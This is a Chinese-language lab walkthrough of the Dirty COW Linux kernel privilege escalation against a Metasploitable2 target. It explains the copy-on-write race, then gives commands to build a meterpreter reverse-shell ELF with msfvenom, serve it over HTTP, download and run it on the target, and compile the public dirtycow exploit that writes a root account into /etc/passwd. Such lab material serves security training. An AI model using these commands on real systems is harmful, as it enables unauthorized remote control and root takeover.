### 脏牛漏洞提权

简单来说，脏牛漏洞的核心原理是：**利用一个竞争条件，在不应该被写入的文件上，强行执行写入操作**

正常情况下，Linux 内核的**写时复制**机制是为了优化内存使用而设计的。当多个进程共享同一个只读内存页时，它们都指向这个内存页

一旦其中一个进程试图修改这块内存，内核不会让它直接修改，而是会为这个进程**复制一份**内存页，然后让该进程在新复制的内存页上进行修改，而其他进程不受影响

脏牛漏洞的利用就是通过巧妙的方式，在这个“复制”的过程中插入一个攻击操作，使得攻击者能够在内核完成复制之前，就对**原始的只读内存页**执行写入操作

我们可以把脏牛漏洞的提权过程分解为以下几个关键步骤：

1. **创建映射：** 攻击者首先使用 `mmap()` 系统调用，将一个**只读文件**（例如 `/etc/passwd`）映射到内存中
2. **触发写时复制：** 攻击者通过多线程或多进程，不断尝试向这个映射的内存页写入数据。这会触发内核的写时复制机制
3. **竞争条件：** 此时，攻击者使用 `madvise()` 系统调用（或类似手段），以极高的频率通知内核，该内存页不需要了（`MADV_DONTNEED`），可以随时丢弃
4. **漏洞利用：** 这时，一个**竞争条件**就产生了。一个线程在不断尝试写入，另一个线程在不断告诉内核内存页可以被丢弃。在特定的时间窗口内，即内核准备好复制内存页**但尚未完成复制**的时候，攻击者成功地向原始的只读内存页执行了写入操作
5. **写入数据：** 最终，攻击者成功地将恶意数据（例如，一个拥有 **root** 权限的新用户条目）写入到原本应该是只读的 `/etc/passwd` 文件中，从而获得了本地的 **root** 权限

环境准备，一台 MSF2 与 Kali Linux

![](https://pic1.imgdb.cn/item/68d22edec5157e1a882a3371.png)

在 Kali Linux 上使用 MSF 生成一个木马

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.41.151 LPORT=8001 -f elf > dirty_cow.elf
```

![](https://pic1.imgdb.cn/item/68d22feac5157e1a882a35d6.png)

开启 HTTP 服务

```
python -m http.server 8888
```

![](https://pic1.imgdb.cn/item/68d23012c5157e1a882a35eb.png)

靶机上去请求下载文件

```
wget http://192.168.41.151:8888/dirty_cow.elf
```

![](https://pic1.imgdb.cn/item/68d230b7c5157e1a882a3644.png)

加权限

```sh
chmod +x dirty_cow.elf
```

![](https://pic1.imgdb.cn/item/68d234c1c5157e1a882a61ee.png)

MSF 监听运行

![](https://pic1.imgdb.cn/item/68d23538c5157e1a882a6ae5.png)

运行程序放在后台

```sh
nohup ./dirty_cow.elf &
```

![](https://pic1.imgdb.cn/item/68d23573c5157e1a882a6fae.png)

靶机上线成功

![](https://pic1.imgdb.cn/item/68d235b8c5157e1a882a74ba.png)

使用 Python 提升为交互式命令行

```
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://pic1.imgdb.cn/item/68d236c6c5157e1a882a87b7.png)

[下载 EXP](https://github.com/FireFart/dirtycow)

放到 Kali Linux 上，靶机请求下载解压缩

```sh
wget http://192.168.41.151:8888/dirtycow-master.zip
unzip dirtycow-master.zip
```

![](https://pic1.imgdb.cn/item/68d237a6c5157e1a882a9661.png)

编译 C 文件

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

`-pthread`

- 为编译和链接启用 POSIX 线程支持
- 在**预处理/编译**阶段会定义宏（例如启用线程相关的特性/代码路径），在**链接**阶段会把需要的线程库和选项加入（相当于同时完成 `-D` 和 `-lpthread` 的效果）
- 推荐用于创建多线程程序；优于单纯用 `-lpthread`，因为 `-pthread` 影响编译器行为和头文件宏

`-lcrypt`

- 链接时加入 `libcrypt`（即 `-lcrypt` 指示链接器使用 `libcrypt.so` / `libcrypt.a`）
- `libcrypt` 提供与密码、散列或 `crypt()` 函数相关的实现（常用于 UNIX 风格的密码散列函数）。如果源代码中使用了 `crypt()` 或该库内的符号，就需要此选项

![](https://pic1.imgdb.cn/item/68d23887c5157e1a882aa829.png)

直接运行需要我们输入新的密码

![](https://pic1.imgdb.cn/item/68d238bfc5157e1a882aab2d.png)

等待一会（参考上面原理）提示用新创建的账号密码登录

![](https://pic1.imgdb.cn/item/68d23920c5157e1a882ab09c.png)

提权成功

![](https://pic1.imgdb.cn/item/68d2395cc5157e1a882ab389.png)